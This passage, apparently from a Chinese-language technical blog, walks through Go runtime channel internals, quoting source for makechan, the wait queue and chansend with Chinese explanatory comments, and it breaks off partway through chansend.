data-num=\"28\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>buf <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">case</span> elem<span class=\"token punctuation\">.</span>PtrBytes <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token comment\">// 元素不包含指针。</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token comment\">// 一次性分配 hchan 和缓冲区。</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">mallocgc</span><span class=\"token punctuation\">(</span>hchanSize<span class=\"token operator\">+</span>mem<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>buf <span class=\"token operator\">=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hchanSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token comment\">// 元素包含指针。</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\tc <span class=\"token operator\">=</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span>hchan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>buf <span class=\"token operator\">=</span> <span class=\"token function\">mallocgc</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token comment\">// 初始化其他字段</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>elemsize <span class=\"token operator\">=</span> <span class=\"token function\">uint16</span><span class=\"token punctuation\">(</span>elem<span class=\"token punctuation\">.</span>Size_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>elemtype <span class=\"token operator\">=</span> elem</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\tc<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token operator\">=</span> <span class=\"token function\">uint</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token function\">lockInit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">,</span> lockRankHchan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token keyword\">if</span> debugChan <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"makechan: chan=\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> <span class=\"token string\">\"; elemsize=\"</span><span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">.</span>Size_<span class=\"token punctuation\">,</span> <span class=\"token string\">\"; dataqsiz=\"</span><span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span> <span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> unsafe<span class=\"token punctuation\">.</span>Pointer <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// 对通道的类似读写操作视为在这个地址进行操作。避免使用 qcount 或 dataqsiz 的地址，</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// 因为 len () 和 cap () 内置函数会读取这些地址，而我们不希望它们与像 close () 这样的操作发生 data race。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">return</span> unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>buf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"><span>o</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// empty reports whether a read from c would block (that is, the channel is</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// empty).  It uses a single atomic read of mutable state.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">empty</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// c.dataqsiz is immutable.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> atomic<span class=\"token punctuation\">.</span><span class=\"token function\">Loadp</span><span class=\"token punctuation\">(</span>unsafe<span class=\"token punctuation\">.</span><span class=\"token function\">Pointer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>sendq<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">return</span> atomic<span class=\"token punctuation\">.</span><span class=\"token function\">Loaduint</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>qcount<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"等待队列\"><a class=\"anchor\" href=\"#等待队列\">#</a> 等待队列</h2>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> waitq <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tfirst <span class=\"token operator\">*</span>sudog</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tlast  <span class=\"token operator\">*</span>sudog</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">//sudog 就是 goroutine</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//enqueue 方法将一个 sudog 指针加入等待队列中。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 这个函数实现了一个双向链表的尾部插入操作。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 如果队列为空，它会初始化 first 和 last 指针；否则，它会将新元素插入到链表末尾。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">*</span>waitq<span class=\"token punctuation\">)</span> <span class=\"token function\">enqueue</span><span class=\"token punctuation\">(</span>sgp <span class=\"token operator\">*</span>sudog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tsgp<span class=\"token punctuation\">.</span>next <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tx <span class=\"token operator\">:=</span> q<span class=\"token punctuation\">.</span>last</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> x <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tsgp<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tq<span class=\"token punctuation\">.</span>first <span class=\"token operator\">=</span> sgp</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tq<span class=\"token punctuation\">.</span>last <span class=\"token operator\">=</span> sgp</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tsgp<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">=</span> x</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tx<span class=\"token punctuation\">.</span>next <span class=\"token operator\">=</span> sgp</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tq<span class=\"token punctuation\">.</span>last <span class=\"token operator\">=</span> sgp</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">*</span>waitq<span class=\"token punctuation\">)</span> <span class=\"token function\">dequeue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>sudog <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tsgp <span class=\"token operator\">:=</span> q<span class=\"token punctuation\">.</span>first</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sgp <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\ty <span class=\"token operator\">:=</span> sgp<span class=\"token punctuation\">.</span>next</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> y <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\tq<span class=\"token punctuation\">.</span>first <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\tq<span class=\"token punctuation\">.</span>last <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\ty<span class=\"token punctuation\">.</span>prev <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\tq<span class=\"token punctuation\">.</span>first <span class=\"token operator\">=</span> y</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\tsgp<span class=\"token punctuation\">.</span>next <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span> <span class=\"token comment\">// 标记为已移除（参见 dequeueSudoG）</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\">// 如果一个 goroutine 由于 select 而被放入此队列，</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token comment\">// 那么在 goroutine 被其他 case 唤醒和获取通道锁之间有一个小的时间窗。</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token comment\">// 一旦它获取了锁，它会将自己从队列中移除，因此我们之后不会再看到它。</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token comment\">// 我们在 G 结构中使用一个标志来告诉我们是否有其他人已经赢得了竞争去唤醒这个 goroutine，</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token comment\">// 但这个 goroutine 还没有从队列中移除自己。</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> sgp<span class=\"token punctuation\">.</span>isSelect <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>sgp<span class=\"token punctuation\">.</span>g<span class=\"token punctuation\">.</span>selectDone<span class=\"token punctuation\">.</span><span class=\"token function\">CompareAndSwap</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t<span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> sgp</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"写入\"><a class=\"anchor\" href=\"#写入\">#</a> 写入</h2>\n<p>当 channel 的 sendq 队列中包含处于等待状态的 goroutine 时，取出队列头的 goroutine，直接调用 send。</p>\n<p>当有缓冲区时，并且缓冲区未满时，写入缓冲区。</p>\n<p>当没有缓冲区时或者缓冲区已满时，阻塞接收。</p>\n<p>向 已经 close 的 channel 写入数据会导致 panic</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// entry point for c &lt;- x from compiled code.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//go:nosplit</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">chansend1</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> elem unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token comment\">//getcallerpc 获取程序计数器</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">chansend</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> elem<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getcallerpc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//chansend 是向通道中发送数据的函数 如果 block 参数不为 nil，则不会 sleep，如果无法成功发送则直接 return。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//chansend 会向 buff 写数据 or 向等待接收队列写数据</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">chansend</span><span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>hchan<span class=\"token punctuation\">,</span> ep unsafe<span class=\"token punctuation\">.</span>Pointer<span class=\"token punctuation\">,</span> block <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> callerpc <span class=\"token builtin\">uintptr</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// 如果 channel 是 nil</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span> c <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token function\">gopark</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> waitReasonChanSendNilChan<span class=\"token punctuation\">,</span> traceBlockForever<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token function\">throw</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unreachable\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">if</span> debugChan <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chansend: chan=\"</span><span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token function\">racereadpc</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span><span class=\"token function\">raceaddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> callerpc<span class=\"token punctuation\">,</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">FuncPCABIInternal</span><span class=\"token punctuation\">(</span>chansend<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token comment\">// Fast path: 在未获取锁的情况下检查非阻塞操作是否失败。</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token comment\">// 在观察到通道未关闭之后，观察通道是否准备好发送。这两个观察都是 a single word-sized 读取（首先是 c.closed 然后是 full ()）。</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token comment\">// 即使通道在两次观察之间关闭，关闭的通道也不能从「准备发送」状态变为「未准备好发送」，</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token comment\">// 在这个时刻通道既未关闭也未准备发送。我们的行为就像是在那个时刻观察到了通道，并报告发送无法进行。</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token comment\">// 这里的读操作顺序可以重排序：如果我们观察到通道未准备好发送然后观察到它未关闭，这意味着在第一次观察期间通道未关闭。然而，这里没有任何东西保证向前推进。</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token comment\">// 我们依赖于 chanrecv () 和 closechan () 中锁释放的副作用来更新此线程对 c.closed 和 full () 的观察。</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>block <span class=\"token operator\">&amp;&amp;</span> c<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">full</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token keyword\">var</span> t0 <span class=\"token builtin\">int64</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token keyword\">if</span> blockprofilerate <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\tt0 <span class=\"token operator\">=</span> <span class=\"token function\">cputicks</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token comment\">// 加锁</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token comment\">// 已被关闭</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>closed <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t<span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token function\">plainError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"send on closed channel\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token keyword\">if</span> sg <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span>recvq<span class=\"token punctuation\">.</span><span class=\"token function\">dequeue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> sg <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t<span class=\"token comment\">// 找到了一个等待接收的 goroutine。直接将要发送的值直接传递给 goroutine，绕过通道缓冲区）。</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t<span class=\"token function\">send</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> sg<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>qcount <span class=\"token operator\">&lt;</span> c<span class=\"token punctuation\">.</span>dataqsiz <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t<span class=\"token comment\">//buff 中有可用空间。将待发送的元素入队。</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\">//qp 指向 buf 的 sendx 位置</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\tqp <span class=\"token operator\">:=</span> <span class=\"token function\">chanbuf</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>sendx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> raceenabled <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\t\t\t<span class=\"token function\">racenotify</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">.</span>sendx<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token comment\">// 将数据从 ep 处拷贝到 qp</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t<span class=\"token function\">typedmemmove</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>elemtype<span class=\"token punctuation\">,</span> qp<span class=\"token punctuation\">,</span> ep<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token comment\">// 发送的游标加 1，如果发送的游标值等于容量值，游标值归 0</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t\tc<span class=\"token punctuation\">.</span>sendx<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>sendx <span class=\"token operator\">==</span> c<span class=\"token 